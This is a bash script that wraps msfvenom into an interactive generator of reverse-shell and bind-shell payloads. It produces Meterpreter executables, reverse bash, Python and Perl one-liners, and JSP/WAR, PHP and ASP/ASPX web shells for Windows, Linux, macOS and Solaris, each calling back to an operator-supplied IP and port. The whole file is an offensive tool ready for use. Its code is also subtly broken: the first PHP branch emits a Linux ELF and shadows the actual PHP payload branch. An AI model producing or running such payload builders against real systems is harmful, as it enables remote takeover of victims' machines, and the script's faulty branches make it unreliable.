#!/bin/bash

options=('windows (exe)' 'linux (elf)' "php" "asp" "aspx" "war" "python" 'bash (sh)' "perl" "jsp" 'linux-bind' 'windows-bind' "cmd" "solaris" "mac" 'mac-bind')

for i in "${options[@]}"; do
echo "$i"
done

echo 'Choose a payload type (note that bind shells require RHOSTS ip)'
read payload

echo "What is your ip?"
read ip

echo "Choose a port"
read port

echo "Choose a file name"
read file

if [[ "$payload" == "windows" || "$payload" == "exe" ]]; then
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f exe > $file.exe
elif [[ "$payload" == "linux" || "$payload" == "elf" ]]; then
        msfvenom -p linux/x64/shell_reverse_tcp LHOST=$ip LPORT=$port -f elf > $file.elf
elif [ "$payload" == "php" ]; then
        msfvenom -p linux/x64/shell_reverse_tcp LHOST=$ip LPORT=$port -f elf > $file.elf
elif [ "$payload" == "php" ]; then
        msfvenom -p php/meterpreter_reverse_tcp LHOST=$ip LPORT=$port -f raw > $file.php
elif [ "$payload" == "aspx" ]; then
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f aspx > $file.aspx
elif [ "$payload" == "war" ]; then
        msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip LPORT=$port -f war > $file.war
elif [ "$payload" == "python" ]; then
        msfvenom -p cmd/unix/reverse_python LHOST=$ip LPORT=$port -f raw > $file.py
elif [[ "$payload" == "bash" || "$payload" == "sh" ]]; then
        msfvenom -p cmd/unix/reverse_bash LHOST=$ip LPORT=$port -f raw > $file.sh
elif [ "$payload" == "perl" ]; then
        msfvenom -p cmd/unix/reverse_perl LHOST=$ip LPORT=$port -f raw > $file.pl
elif [ "$payload" == "jsp" ]; then
        msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip LPORT=$port -f raw> $file.jsp
elif [ "$payload" == "linux-bind" ]; then
        msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=$ip LPORT=$port -f elf > $file.elf
elif [ "$payload" == "windows-bind" ]; then
        msfvenom -p windows/meterpreter/bind_tcp RHOST=$ip LPORT=$port -f exe > $file.exe
elif [ "$payload" == "cmd" ]; then
        msfvenom -p windows/shell/reverse_tcp LHOST=$ip LPORT=$port -f exe > $file.exe
elif [ "$payload" == "solaris" ]; then
        msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=$ip LPORT=$port -f elf -e x86/shikata_ga_nai -b '\x00' > $file.elf
elif [ "$payload" == "mac" ]; then
        msfvenom -p osx/x86/shell_reverse_tcp LHOST=$ip LPORT=$port -f macho > $file.macho
elif [ "$payload" == "mac-bind" ]; then
        msfvenom -p osx/x86/shell_bind_tcp RHOST=$ip LPORT=$port -f macho > $file.macho
elif [ "$payload" == "asp" ]; then
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f asp > $file.asp
else
        echo "Unsupported payload type"
fi
